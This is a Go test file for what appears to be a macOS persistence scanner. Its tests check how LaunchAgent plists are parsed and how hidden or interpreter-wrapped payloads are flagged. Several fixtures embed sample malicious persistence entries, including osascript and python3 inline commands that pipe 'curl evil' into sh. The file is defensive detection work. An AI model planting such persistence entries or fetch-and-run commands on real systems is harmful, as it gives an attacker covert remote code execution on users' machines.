package collect

import (
	"os"
	"testing"

	"counterspy/internal/model"
)

func TestParsePersistencePlist_FlagsHiddenTarget(t *testing.T) {
	b, err := os.ReadFile("../../testdata/agent_evil.plist.xml")
	if err != nil {
		t.Fatal(err)
	}
	ev, err := ParsePersistencePlist(b, "/Users/me/Library/LaunchAgents/com.evil.updater.plist")
	if err != nil {
		t.Fatal(err)
	}
	if len(ev) == 0 {
		t.Fatal("expected evidence")
	}
	var sawHidden bool
	for _, e := range ev {
		if e.Kind != model.KindPersistence {
			t.Errorf("wrong kind %q", e.Kind)
		}
		if e.Subject.Label != "com.evil.updater" {
			t.Errorf("label not propagated: %q", e.Subject.Label)
		}
		if e.Facts["target"] == "/Users/me/Library/.hidden/beacon" {
			sawHidden = true
		}
	}
	if !sawHidden {
		t.Error("expected the hidden target path in Facts")
	}
}

// cp-5 Audit F-1: /usr/bin/env-wrapped persistence must resolve to the real payload,
// not the interpreter.
func TestExtractLabelAndTarget_EnvWrapperPicksPayload(t *testing.T) {
	x := []byte(`<plist><dict>
	  <key>Label</key><string>com.evil</string>
	  <key>ProgramArguments</key><array><string>/usr/bin/env</string><string>/Users/me/.hidden/payload</string></array>
	</dict></plist>`)
	label, target := extractLabelAndTarget(x)
	if label != "com.evil" {
		t.Errorf("label=%q want com.evil", label)
	}
	if target != "/Users/me/.hidden/payload" {
		t.Errorf("target=%q want the real payload, not the interpreter", target)
	}
}

// T-7: interpreter + inline-code persistence (`osascript -e <payload>`) resolves argv[0] to an
// Apple-signed interpreter. Without interpreter-awareness the interpreter becomes Subject.Path and
// codesign whitewashes the entry as trusted. The inline source is the real payload: the trusted
// interpreter must NOT be the subject, and a dedicated finding must carry the source.
func TestParsePersistencePlist_InlineInterpreterIsPayload(t *testing.T) {
	x := []byte(`<plist><dict>
	  <key>Label</key><string>com.evil.osa</string>
	  <key>ProgramArguments</key><array><string>/usr/bin/osascript</string><string>-e</string><string>do shell script "curl evil|sh"</string></array>
	</dict></plist>`)
	ev, err := ParsePersistencePlist(x, "/Users/me/Library/LaunchAgents/com.evil.osa.plist")
	if err != nil {
		t.Fatal(err)
	}
	var inline *model.Evidence
	for i := range ev {
		if ev[i].Summary == "persistence runs inline interpreter code" {
			inline = &ev[i]
		}
		// The Apple-signed interpreter must never become the codesign subject.
		if ev[i].Subject.Path == "/usr/bin/osascript" {
			t.Fatalf("interpreter must not be the subject (codesign would whitewash it): %+v", ev[i].Subject)
		}
	}
	if inline == nil {
		t.Fatal("expected an inline-interpreter-code finding")
	}
	if inline.Weight != wInlineCode {
		t.Errorf("inline finding weight=%d want %d", inline.Weight, wInlineCode)
	}
	if inline.Facts["interpreter"] != "osascript" {
		t.Errorf("interpreter fact=%q want osascript", inline.Facts["interpreter"])
	}
	if inline.Facts["inline_code"] != `do shell script "curl evil|sh"` {
		t.Errorf("inline_code fact must carry the source for RCA, got %q", inline.Facts["inline_code"])
	}
}

// T-7 (Antagonist A1): `/usr/bin/env python3 -c <src>`; the env wrapper must be stripped so the
// real interpreter is seen, the inline source is the payload, and neither env nor the interpreter
// becomes the codesign subject.
func TestParsePersistencePlist_EnvWrappedInlineInterpreter(t *testing.T) {
	x := []byte(`<plist><dict>
	  <key>Label</key><string>com.evil.env</string>
	  <key>ProgramArguments</key><array><string>/usr/bin/env</string><string>python3</string><string>-c</string><string>import os;os.system("curl evil|sh")</string></array>
	</dict></plist>`)
	ev, _ := ParsePersistencePlist(x, "/Users/me/Library/LaunchAgents/com.evil.env.plist")
	var inline *model.Evidence
	for i := range ev {
		if ev[i].Summary == "persistence runs inline interpreter code" {
			inline = &ev[i]
		}
		if s := ev[i].Subject.Path; s == "/usr/bin/env" || s == "/usr/bin/python3" || s == "python3" {
			t.Fatalf("neither env nor the interpreter may be the codesign subject, got %q", s)
		}
	}
	if inline == nil {
		t.Fatal("env-wrapped inline interpreter must still be detected")
	}
	if inline.Facts["interpreter"] != "python3" {
		t.Errorf("interpreter fact=%q want python3 (env stripped)", inline.Facts["interpreter"])
	}
}

// T-7 (Antagonist A2): interpreter name matching must be case-insensitive (macOS case-insensitive
// filesystems let a plist spell `/usr/bin/Python3`).
func TestParsePersistencePlist_InterpreterMatchIsCaseInsensitive(t *testing.T) {
	x := []byte(`<plist><dict>
	  <key>Label</key><string>com.evil.case</string>
	  <key>ProgramArguments</key><array><string>/usr/bin/Python3</string><string>-c</string><string>evil()</string></array>
	</dict></plist>`)
	ev, _ := ParsePersistencePlist(x, "/Users/me/Library/LaunchAgents/com.evil.case.plist")
	var saw bool
	for _, e := range ev {
		if e.Summary == "persistence runs inline interpreter code" {
			saw = true
		}
	}
	if !saw {
		t.Fatal("case-variant interpreter name must still be detected")
	}
}

// T-7 (Audit F-1): the whitewash also survives without an inline flag; an interpreter with a
// RELATIVE script arg leaves pickTarget resolving to the interpreter itself. The trusted shim must
// never be the codesign subject even in this non-inline shape.
func TestParsePersistencePlist_InterpreterNeverBecomesSubject(t *testing.T) {
	x := []byte(`<plist><dict>
	  <key>Label</key><string>com.evil.rel</string>
	  <key>ProgramArguments</key><array><string>/usr/bin/osascript</string><string>payload.scpt</string></array>
	</dict></plist>`)
	ev, _ := ParsePersistencePlist(x, "/Users/me/Library/LaunchAgents/com.evil.rel.plist")
	if len(ev) == 0 {
		t.Fatal("expected user-level evidence")
	}
	for _, e := range ev {
		if e.Subject.Path == "/usr/bin/osascript" {
			t.Fatal("a trusted interpreter must never be the codesign subject (whitewash)")
		}
	}
}

// T-7 (Audit F-3): inline-code flags are interpreter-scoped; `node -r <module>` is require, NOT
// inline code. A legit dev-tooling agent must not be flagged, and its real script target must be
// preserved (not discarded via the plist fallback).
func TestParsePersistencePlist_NodeRequireIsNotInlineCode(t *testing.T) {
	x := []byte(`<plist><dict>
	  <key>Label</key><string>com.dev.node</string>
	  <key>ProgramArguments</key><array><string>/usr/local/bin/node</string><string>-r</string><string>ts-node/register</string><string>/Users/me/app/index.js</string></array>
	</dict></plist>`)
	ev, _ := ParsePersistencePlist(x, "/Users/me/Library/LaunchAgents/com.dev.node.plist")
	for _, e := range ev {
		if e.Summary == "persistence runs inline interpreter code" {
			t.Fatal("node -r (require) must NOT be classified as inline code")
		}
		if e.Facts["target"] != "/Users/me/app/index.js" {
			t.Errorf("real script target must be preserved, got %q", e.Facts["target"])
		}
	}
}

// A non-inline interpreter running a script FILE (`python3 /path/script.py`) is the existing
// env-wrapper case: the script path is the payload and there is no inline-code finding.
func TestParsePersistencePlist_ScriptFileIsNotInlineCode(t *testing.T) {
	x := []byte(`<plist><dict>
	  <key>Label</key><string>com.tool</string>
	  <key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>/Users/me/.hidden/payload.py</string></array>
	</dict></plist>`)
	ev, err := ParsePersistencePlist(x, "/Users/me/Library/LaunchAgents/com.tool.plist")
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range ev {
		if e.Summary == "persistence runs inline interpreter code" {
			t.Fatal("a script-file interpreter invocation must NOT be flagged as inline code")
		}
		if e.Facts["target"] != "/Users/me/.hidden/payload.py" {
			t.Errorf("target must be the script payload, got %q", e.Facts["target"])
		}
	}
}

// cp-5 QA F-3: a decoy string value equal to "Label" must not poison key detection.
func TestExtractLabelAndTarget_DecoyValueDoesNotPoisonLabel(t *testing.T) {
	x := []byte(`<plist><dict>
	  <key>Comment</key><string>Label</string>
	  <key>Label</key><string>com.real.label</string>
	  <key>ProgramArguments</key><array><string>/bin/target</string></array>
	</dict></plist>`)
	label, _ := extractLabelAndTarget(x)
	if label != "com.real.label" {
		t.Errorf("label=%q want com.real.label (decoy poisoned key tracking)", label)
	}
}
